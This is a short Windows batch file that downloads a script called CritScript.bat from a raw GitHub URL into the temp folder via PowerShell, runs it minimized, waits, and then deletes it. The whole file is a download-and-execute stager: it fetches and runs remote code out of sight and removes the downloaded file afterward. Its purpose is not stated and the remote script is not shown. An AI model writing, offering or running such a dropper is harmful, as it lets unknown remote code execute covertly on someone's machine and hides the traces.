@echo off
cd %TEMP%
Powershell -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/DARJARN7/DDNS/main/CritScript.bat' -OutFile CritScript.bat"
start /min CritScript.bat
timeout 6
del CritScript.bat
